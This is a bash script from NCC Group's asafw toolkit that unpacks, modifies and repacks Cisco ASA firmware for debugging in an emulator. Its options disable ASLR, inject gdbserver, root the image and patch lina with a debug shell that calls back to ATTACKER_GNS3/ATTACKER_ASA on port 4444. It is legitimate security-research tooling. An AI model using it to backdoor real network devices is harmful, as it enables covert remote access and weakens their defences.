#!/bin/bash
#
# This file is part of asafw.
# Copyright (c) 2017, Aaron Adams <aaron.adams(at)nccgroup(dot)trust>
# Copyright (c) 2017, Cedric Halbronn <cedric.halbronn(at)nccgroup(dot)trust>
#
# This script is used to unpack all Cisco ASA routers .bin firmwares,
# modify some files in order to start gdb after booting the OS.
# It can be used for anything related to modifying files in the filesystem.
#
# This is useful when debugging ASAv firmware in GNS3. Indeed, some firmware do
# not have GDB so we need to add it. Also, we can enable/disable that GDB starts
# at boot and wait for us to attach to the GDB server by commenting/uncommenting
# the appropriate line. Finally, it can be used for any custom modification we want
# to do (for testing purpose)
#
# This script can also be used to extract files from Cisco ASA routers .bin firmwares.
# It supports asa8**-k8.bin, asa9**-k8.bin firmware in both 32-bit and 64-bit.
# It does the following:
# - extract each .bin firmware into a directory with the same name (.extracted) in the same directory
# - tries to extract lina executable if -l is specified
#
# TODO:
# - remove temporary files? or order them
# - It does not support asa7**-k8.bin firmware yet because they don't contain
#   a rootfs as other versions.
# - have a safe way to delete temporary files by specifying option from the command line
#   (commented for now - use at your own risks)
#
# Dependencies
# - binwalk > 2.0
# sudo apt-get install binwalk
# eg: from the source: https://github.com/devttys0/binwalk
# - 7z
# sudo apt-get install p7zip-full

usage()
{
    echo "Usage:"
    echo "./unpack_repack_bin.sh -i <firmware_file> -o <out_dir> [-f -g -G -a -A -m -b -r -u -l <linabin_dir> -d -e -k]"
    echo "      -h, --help                    This help menu"
    echo "      -i, --input <firmware_file>   What firmware bin to operate on"
    echo "      -o, --output  <out_dir>       Where to write new firmware"
    echo "      -f, --free-space              Remove space from .bin to ensure injections fit"
    echo "      -g, --enable-gdb              Set gdb to start on boot"
    echo "      -G, --disable-gdb             Stop gdb from starting on boot"
    echo "      -a, --enable-aslr             Turn on ASLR"
    echo "      -A, --disable-aslr            Turn off ASLR"
    echo "      -m, --inject-gdb              Inject gdbserver to run"
    echo "      -b, --debug-shell             Inject ssh-triggered debug shell"
    echo "      -H, --lina-hook               Inject hooks for monitor lina heap (requires -b)"
    echo "      -r, --root                    root the bin to get a rootshell on boot"
    echo "      -c, --custom                  custom?"
    echo "      -n, --n-custom                custom?"
    echo "      -q, --gns3-fixup              gns?"
    echo "      -u, --unpack-only             unpack the firmware and nothing else"
    echo "      -l, --linabins <linabin_dir>  destination folder to save lina binaries"
    echo "      -d, --delete-extracted        delete files extracted during modification"
    echo "      -e, --delete-original-bin     delete the original firmware being modified"
    echo "      -k, --keep-rootfs             keep the extracted rootfs on disk"
    echo "      -s, --simple-name             use a simple name for the output .bin with just appended '-repacked'"
    echo "Examples:"
    echo " ./unpack_repack_bin.sh -i /home/user/firmware -o /home/user/firmware_repacked --free-space --enable-gdb --inject-gdb"
    echo " ./unpack_repack_bin.sh -i /home/user/firmware/asa961-smp-k8.bin -f -g -m"
    echo " ./unpack_repack_bin.sh -u -i /home/user/firmware -l /home/user/linabins"
    echo " ./unpack_repack_bin.sh -u -i /home/user/firmware/asa924-k8.bin -k"
    exit 1
}

# versions < 8.2.3 don't have the rootfs in rootfs.img but in a filename containing digits only
# ASAv961 has a a .gz additional extension in rootfs image name
determine_rootfs_name()
{
    ROOTFS=rootfs.img
    if [ -f ${ROOTFS} ]; then
        echo "[unpack_repack_bin] Firmware uses regular rootfs/ dir"
    elif [ -f "rootfs.img.gz" ]; then
        ROOTFS=rootfs.img.gz
        echo "[unpack_repack_bin] Firmware uses regular rootfs.img.gz file"
    else
        for EXTRACTFILE in $(find * -maxdepth 0 -type f);
        do
            TMP=`file ${EXTRACTFILE}`
            if [[ $TMP == *"ASCII cpio archive"* ]];
            then
                ROOTFS=${EXTRACTFILE}
                echo "[unpack_repack_bin] Firmware uses ${ROOTFS} rootfs file"
                break
            fi
        done
    fi
#    echo Using ${ROOTFS}...
}

# extract a .bin using binwalk (old method)
# requires $FWFILE to be initialised
# and current folder being the dirname of $FWFILE
extract_one()
{
    echo "[unpack_repack_bin] extract_one: $FWFILE"
    ${BINWALK} -e ${FWFILE}
    if [ $? != 0 ];
    then
        echo "[unpack_repack_bin] Error: Binwalk failed. Exiting"
        exit 1
    fi
    FWFOLDER=$(pwd)/_${FWFILE}.extracted
    if [ ! -d "${FWFOLDER}" ]; then
        echo "[unpack_repack_bin] Error: binwalk extraction failed. Didn't find ${FWFOLDER}"
        return
    fi
    cd ${FWFOLDER}
    # better safe than sorry. If we can't go in, when we go out later
    # we will go back in the arborescence and do bad stuff, such as delete files, etc...
    if [ $? != 0 ];
    then
        echo "[unpack_repack_bin] Error: Couldn't enter ${FWFOLDER} for some reason. Exiting"
        exit 1
    fi
    echo "[unpack_repack_bin] Extracted firmware to ${FWFOLDER}"
    determine_rootfs_name
    # we create a directory to avoid extracting everything
    # in the middle of other files
    if [ ! -d "rootfs" ]; then
        mkdir rootfs
    fi
    cd rootfs
    echo "[unpack_repack_bin] Extracting ${FWFOLDER}/rootfs/${ROOTFS} into $(pwd)"
    # We really need --no-absolute-filenames as otherwise we may corrupt
    # our own filesystem...
    ${CPIO} -id --no-absolute-filenames < ../${ROOTFS}
    LINA=${FWFOLDER}/rootfs/asa/bin/lina
    if [[ ! -z $LINABINDIR && -d $LINABINDIR ]]
    then
        mkdir ${LINABINDIR}/${FWFILE}
        cp ${LINA} ${LINABINDIR}/${FWFILE}/
    fi

    cd ..
    cd ..

    # we need space here...
    if [[ "$KEEP_ROOTFS" == "YES" ]]
    then
        echo "[unpack_repack_bin] Keeping rootfs"
        # we only keep the rootfs directory which is not a regular file
        for F in $(find ${FWFOLDER} -maxdepth 1 -type f);
        do
            echo "[unpack_repack_bin] Deleting \"${F}\""
            rm -f "${F}"
        done
    fi
    if [[ "$DELETE_EXTRACTED" == "YES" ]]
    then
        echo "[unpack_repack_bin] Deleting extracted files"
        # We only delete folders of the following format _*.extracted
        # The reason we do that is we don't want to rm -Rf arbitrary
        # folders
        echo "[unpack_repack_bin] Deleting \"${FWFOLDER}\""
        rm -Rf ${FWFOLDER}
    fi
    if [[ "$DELETE_BIN" == "YES" ]]
    then
        echo "[unpack_repack_bin] Deleting original firmware bin"
        echo "[unpack_repack_bin] Deleting \"${FWFILE}\""
        rm ${FWFILE}
    fi
}

# requires $FWFILE to be initialised
# and current folder being the dirname of $FWFILE
unpack_repack_one()
{
    if [[ "$UNPACK_ONLY" == "YES" ]]
    then
        extract_one
    else

        # root is needed so the repacked version has the right uid/gid
        if [ "$(whoami)" != "root" ]; then
            echo "[unpack_repack_bin] You need to be root so repacked version has the right uid/gid"
            echo "[unpack_repack_bin] NOTE: Use sudo -E if you sourced env.sh"
            exit 1
        fi
        unpack_one
        modify_one
        repack_one
    fi
}

# extract a .bin using our own python script (new method)
# the same script is used to re-inject the cpio/gz into the .bin
unpack_one()
{
    echo "[unpack_repack_bin] unpack_one: $FWFILE"
    INFILE=$(pwd)/${FWFILE}
    # get filename without extension and extension
    OUTFILE=$(basename "$FWFILE")
    EXTFILE=${FWFILE##*.}
    
    OUTFILE_SUFFIX=
    if [[ "${SIMPLE_NAME}" != "YES" ]]; then
        if [[ "${DEBUGSHELL}" == "YES" ]] 
        then
            OUTFILE_SUFFIX=-debugshell
        fi
        if [[ "${LINAHOOK}" == "YES" ]] 
        then
            OUTFILE_SUFFIX=$OUTFILE_SUFFIX-hooked
        fi
    fi
    if [[ "${OUTFILE_SUFFIX}" == "" ]] 
    then
        OUTFILE_SUFFIX=-repacked
    fi
    if [[ "${ROOT}" == "YES" ]] 
    then
        OUTFILE_SUFFIX=$OUTFILE_SUFFIX-rooted
    fi
    if [[ "${ENABLE_GDB}" == "YES" ]] 
    then
        OUTFILE_SUFFIX=$OUTFILE_SUFFIX-gdbserver
    fi
    OUTFILE_SUFFIX=$OUTFILE_SUFFIX.${EXTFILE}
    OUTFILE=${OUTDIR}/${OUTFILE%.*}${OUTFILE_SUFFIX}

    # get filename without extension
    BASEFWFILE=$(basename "$INFILE")
    FOLDERFWFILE=$(dirname "$INFILE")
    BASEFWFILE_NOEXT=${BASEFWFILE%.*}
    GZIP_ORIGINAL=${FOLDERFWFILE}/${BASEFWFILE_NOEXT}-initrd-original.gz
    CPIO_ORIGINAL=${FOLDERFWFILE}/${BASEFWFILE_NOEXT}-initrd-original.cpio 
    # we should not really care about the name of the gzip. However, if we want to re-unpack
    # the file that we are repacking, we need that it uses the "rootfs.img" as this is what
    # we use to locate the rootfs.img inside the .bin in bin.py
    #GZIP_MODIFIED=${FOLDERFWFILE}/${BASEFWFILE_NOEXT}-initrd-modified.gz
    # Actually looks like this is not even enough. Well, we should not need to do that several times
    # anyway. We can always come back to the original one to do all in once :)
    GZIP_MODIFIED=${FOLDERFWFILE}/rootfs.img.gz
    VMLINUZ_ORIGINAL=${FOLDERFWFILE}/${BASEFWFILE_NOEXT}-vmlinuz

    ${FWTOOL} -u -f "$INFILE"
    if [ $? != 0 ];
    then
        echo "${FWTOOL} -u -f "$INFILE" failed"
        exit 1
    fi
    ${GUNZIP} -c "$GZIP_ORIGINAL" > "$CPIO_ORIGINAL"
    rm -Rf work
    mkdir work
    cd work
    # We really need --no-absolute-filenames as otherwise we may corrupt
    # our own filesystem...
    ${CPIO} -id --no-absolute-filenames < "$CPIO_ORIGINAL"

}

# modify extract files (typically the files from the ramdisk)
# so we can repack it later
modify_one()
{
    echo "[unpack_repack_bin] modify_one: $FWFILE"
    
    # disable ASLR
    # /etc/sysctl.conf -> /etc/sysctl.conf.props so we follow symlink otherwise it will modify our host one :/
    if [[ "$DISABLE_ASLR" == "YES" ]]
    then
        echo "[unpack_repack_bin] DISABLE ASLR"
        # we can't just add the following line
        #echo "kernel.randomize_va_space = 0" >> etc/sysctl.conf.procps
        # because it looks like rcS.common overrides our value later in the boot process
        # so we just make the modification in rcS.common :)
        sed -i 's/echo 2 > \/proc\/sys\/kernel\/randomize_va_space/echo 0 > \/proc\/sys\/kernel\/randomize_va_space/' asa/scripts/rcS.common
    fi

    # enable gdb at boot
    if [[ "$ENABLE_GDB" == "YES" ]]
    then
        echo "[unpack_repack_bin] ENABLE GDB"
        if [[ "$FWFILE" == *"asa803"* ]]
        then
            echo "[unpack_repack_bin] Old method + patching serial port in lina_monitor"
            sed -i 's/\(\/asa\/bin\/lina_monitor\)/\1 -g -s \/dev\/ttyS0 -d/' etc/init.d/rcS
            cp ${FIRMWAREDIR}/_asa803/lina_monitor_patched $(pwd)/asa/bin/lina_monitor
        else
            echo "[unpack_repack_bin] Recent method"
            sed -i 's/#\(.*\)ttyUSB0\(.*\)/\1ttyS0\2/' asa/scripts/rcS
        fi
    fi

    # disable gdb at boot
    if [[ "$DISABLE_GDB" == "YES" ]]
    then
        echo "[unpack_repack_bin] DISABLE GDB"
        sed -i 's/echo\(.*\)ttyUSB0\(.*\)/#echo\1ttyS0\2/' asa/scripts/rcS
    fi

    # fix GNS3 network interface
    if [[ "$FIX_GNS3_INTERFACE" == "YES" ]]
    then
        echo "[unpack_repack_bin] FIXING GNS3 INTERFACE"
        echo "[unpack_repack_bin] Error: Not done yet"
#sed -i 's/echo\(.*\)ttyUSB0\(.*\)/#echo\1ttyS0\2/' asa/scripts/rcS
    fi

    # free some space
    if [[ "$FREE_SPACE" == "YES" ]]
    then
        echo "[unpack_repack_bin] FREE SPACE IN .BIN"
        rm -Rf usr/test/*
        if [[ -e 'usr/bin/qemu-system-x86_64' ]]; then
            rm usr/bin/qemu-system-x86_64 # 5.2 MB
        fi
        if [[ -e 'asa/html/dd/fdd.swf' ]]; then
            rm asa/html/dd/fdd.swf # 1.3 MB
        fi
    fi

    # inject gdbserver from other firmware
    if [[ "$INJECT_GDB" == "YES" ]]
    then
        if [[ -e 'usr/bin/gdbserver' ]]; then
            echo "[unpack_repack_bin] WARNING: This firmware already has a gdbserver."
            echo "[unpack_repack_bin] WARNING: Injecting another gdbserver might cause issues."
            echo "[unpack_repack_bin] WARNING: Injecting is only relevant to 64-bit ASA or really old 32-bit ASA devices"
            echo "[unpack_repack_bin] WARNING: Are you sure?  (ctrl-c if not. enter if yes)"
            read CMD
        fi
        echo "[unpack_repack_bin] INJECT OTHER GDB"
        if [[ "$FWFILE" == *"asa803"* ]]; then
            FIRMWARE_WITH_GDB="asa924-k8.bin"
        else
            FIRMWARE_WITH_GDB="asa931-smp-k8.bin"
        fi
        echo "[unpack_repack_bin] Using gdbserver from ${FIRMWARE_WITH_GDB}"
        if [ ! -d "${FIRMWAREDIR}/_${FIRMWARE_WITH_GDB}.extracted" ]; then
            echo "[unpack_repack_bin] [!] Didn't find ${FIRMWAREDIR}/_${FIRMWARE_WITH_GDB}.extracted"
            echo "[unpack_repack_bin] [!] Need to binwalk ${FIRMWARE_WITH_GDB} to allow file stealing"
            if [ ! -e "${FIRMWAREDIR}/${FIRMWARE_WITH_GDB}" ]; then
                echo "[unpack_repack_bin] [!] Can't find ${FIRMWAREDIR}/${FIRMWARE_WITH_GDB} so can't binwalk it ourselves"
                exit 1
            fi
            LASTDIR=$(pwd)
            cd ${FIRMWAREDIR}
            ${BINWALK} -e ${FIRMWARE_WITH_GDB}
            cd ${LASTDIR}
        fi
        if [[ "$FWFILE" == *"asa803"* ]]; then
            # On ASA803, the gdbserver is not able to "info proc cmdline" or "info proc mappings"
            # The gdbserver from ASA924 is better in that we can at least "info proc cmdline"....
            cp ${FIRMWAREDIR}/_${FIRMWARE_WITH_GDB}.extracted/rootfs/usr/bin/gdbserver bin/
        else        
            cp ${FIRMWAREDIR}/_${FIRMWARE_WITH_GDB}.extracted/rootfs/usr/bin/gdbserver usr/bin/
            cp ${FIRMWAREDIR}/_${FIRMWARE_WITH_GDB}.extracted/rootfs/lib64/libthread_db-1.0.so lib64/
            # we should copy the symlink instead of copying the file but does the job for now
            cp ${FIRMWAREDIR}/_${FIRMWARE_WITH_GDB}.extracted/rootfs/lib64/libthread_db.so.1 lib64/
        fi
    fi
    
    if [[ "$DEBUGSHELL" == "YES" ]]
    then
        ADDITIONAL_ARGS=""
        if [[ "${LINAHOOK}" == "YES" ]]
        then
            ADDITIONAL_ARGS="--hook"
        fi
        CBPORT="4444"
        if [[ "$FWFILE" == *"asav"* ]]
        then
            echo "[unpack_repack_bin] Using 64-bit firmware"
            CBHOST=${ATTACKER_GNS3}
            echo "[unpack_repack_bin] Patching lina_monitor"
            if [[ "$FWFILE" == *"asav962-7"* ]]
            then
                cp ${FIRMWAREDIR}/_asav962-7/lina_monitor_patched $(pwd)/asa/bin/lina_monitor
            elif [[ "$FWFILE" == *"asav941-200"* ]]
            then
                cp ${FIRMWAREDIR}/_asav941-200/lina_monitor_patched $(pwd)/asa/bin/lina_monitor
            elif [[ "$FWFILE" == *"asav981-5"* ]]
            then
                cp ${FIRMWAREDIR}/_asav981-5/lina_monitor_patched $(pwd)/asa/bin/lina_monitor
            else
                echo "[unpack_repack_bin] ERROR: You need to add lina_monitor support"
                exit 1
            fi
        else
            echo "[unpack_repack_bin] Using 32-bit firmware"
            CBHOST=${ATTACKER_ASA}
        fi
        echo "[unpack_repack_bin] Adding debug shell for $CBHOST:$CBPORT"
        # XXX - fix fact that we use -b to specify the bin_name but it would not work if the name is not one of the original Cisco ones (such as asa924-k8.bin)
        ${LINA_LINUXSHELL} -b "$FWFILE" -f $(pwd)/asa/bin/lina -o $(pwd)/asa/bin/lina -c $CBHOST -p $CBPORT -d "$ASADBG_DB" ${ADDITIONAL_ARGS}
        if [ $? != 0 ];
        then
            echo "${LINA_LINUXSHELL} -b "$FWFILE" -f $(pwd)/asa/bin/lina -o $(pwd)/asa/bin/lina -c $CBHOST -p $CBPORT -d "$ASADBG_DB" failed"
            exit 1
        fi
    fi
    
    # custom: can be used for testing purpose before we add something useful as a real command line option
    if [[ "$CUSTOM" == "YES" ]]
    then
        echo "[unpack_repack_bin] DOING CUSTOM STUFF: fill it yourself :)"
        # ...
    fi
}

repack_one()
{
    echo "[unpack_repack_bin] repack_one: $FWFILE"

    find . | ${CPIO} -o -H newc | gzip > "$GZIP_MODIFIED"
    cd ..
    #ls -l *.gz
    
    if [[ "${ROOT}" == "YES" ]] 
    then
        ROOTARGS=--root
    else
        ROOTARGS=
    fi
    ${FWTOOL} -r -f "$FWFILE" -g "$GZIP_MODIFIED" -o "$OUTFILE" $ROOTARGS
    if [ $? != 0 ];
    then
        echo "${FWTOOL} -r -f "$FWFILE" -g "$GZIP_MODIFIED" -o "$OUTFILE" $ROOTARGS failed"
        exit 1
    fi

    echo -n "[unpack_repack_bin] MD5: "
    md5sum "${OUTFILE}"
    # cleanup
    if [[ "$NO_CLEANUP" == "NO" ]]
    then
        echo "[unpack_repack_bin] CLEANUP"
        rm $GZIP_ORIGINAL $CPIO_ORIGINAL $GZIP_MODIFIED $VMLINUZ_ORIGINAL
    fi

}

if [ -z "${ASATOOLS}" ]; then
    echo "[unpack_repack_bin] This tool relies on env.sh which has not been sourced"
    exit 1
fi

BINWALK=$(which binwalk)
if [ -z "${BINWALK}" ]; then
    echo "[unpack_repack_bin] Error: binwalk not found. Required for extract_repack_bin.sh usage"
    echo "[unpack_repack_bin] Error: NOTE: binwalk must be > v2.0"
    exit 1
fi
GUNZIP=gunzip
CPIO=cpio

# http://stackoverflow.com/questions/192249/how-do-i-parse-command-line-arguments-in-bash
WORKINGDIR=
OUTDIR=
FREE_SPACE="NO"
ENABLE_GDB="NO"
DISABLE_GDB="NO"
ENABLE_ASLR="NO"
DISABLE_ASLR="NO"
INJECT_GDB="NO"
CUSTOM="NO"
NO_CLEANUP="NO"
DEBUGSHELL="NO"
LINAHOOK="NO"
ROOT="NO"
LINABINDIR=
DELETE_EXTRACTED="NO"
KEEP_ROOTFS="NO"
DELETE_BIN="NO"
UNPACK_ONLY="NO"
SIMPLE_NAME="NO"
while [[ $# -gt 0 ]]
do
    key="$1"

    case $key in
        -i|--input)
        # Input firmware directory or file
        WORKINGDIR="$2"
        shift # past argument
        ;;
        -o|--output)
        OUTDIR="$2"
        shift # past argument
        ;;
        -s|--simple-name)
        SIMPLE_NAME="YES"
        ;;
        -f|--free-space)
        FREE_SPACE="YES"
        ;;
        -g|--enable-gdb)
        ENABLE_GDB="YES"
        ;;
        -G|--disable-gdb)
        DISABLE_GDB="YES"
        ;;
        -a|--enable-aslr)
        ENABLE_ASLR="YES"
        ;;
        -A|--disable-aslr)
        DISABLE_ASLR="YES"
        ;;
        -m|--inject-gdb)
        INJECT_GDB="YES"
        ;;
        -b|--debug-shell)
        DEBUGSHELL="YES"
        ;;
        -H|--lina-hook)
        LINAHOOK="YES"
        ;;
        -c|--custom)
        CUSTOM="YES"
        ;;
        -n|--no-cleanup)
        NO_CLEANUP="YES"
        ;;
        -q|--gns3-fixup)
        FIX_GNS3_INTERFACE="YES"
        ;;
        -r|--root)
        ROOT="YES"
        ;;
        -l|--linabins)
        # Destination to store extracted binaries
        LINABINDIR="$2"
        mkdir $LINABINDIR
        shift # past argument
        ;;
        -d|--delete-extracted)
        # Delete extracted files
        DELETE_EXTRACTED="YES"
        ;;
        -e|--delete-original-bin)
        # Delete original .bin file
        DELETE_BIN="YES"
        ;;
        -k|--keep-rootfs)
        # Keep rootfs file
        KEEP_ROOTFS="YES"
        ;;
        -u|--unpack-only)
        UNPACK_ONLY="YES"
        ;;
        -h|--help)
        usage
        ;;
        *)
        # unknown option
        echo "[unpack_repack_bin] Error: Unknown option provided: $key"
        usage
        ;;
    esac
    shift # past argument or value
done

if [[ -z $WORKINGDIR || ! -e $WORKINGDIR ]]
then
    echo "You must specify at least a valid -i"
    usage
fi
if [[ -d $WORKINGDIR && -z $OUTDIR ]]
then
    echo "You must specify an output directory with a directory in -i"
    usage
fi
if [[ -f $WORKINGDIR && ! -z $OUTDIR ]]
then
    echo "-o is ignored if -i is a file"
    usage
fi

if [[ "${LINAHOOK}" == "YES" && "${DEBUGSHELL}" == "NO" ]]
then
    echo "--lina-hook (-H) requires --debug-shell (-b) currently"
    usage
fi

if [ -d $WORKINGDIR ]
then
    echo "[unpack_repack_bin] Directory of firmware detected: $WORKINGDIR"
    ORIGDIR=${PWD}
    cd ${WORKINGDIR}
    for FWFILE in $(find * -maxdepth 0 -type f);
    do
        unpack_repack_one
    done
    cd ${ORIGDIR}
elif [ -f $WORKINGDIR ]
then
    echo "[unpack_repack_bin] Single firmware detected"
    FWFILE=$(basename "$WORKINGDIR")
    WORKINGDIR=$(dirname "$WORKINGDIR")
    OUTDIR=$WORKINGDIR
    ORIGDIR=${PWD}
    cd ${WORKINGDIR}
    unpack_repack_one
    cd ${ORIGDIR}
fi
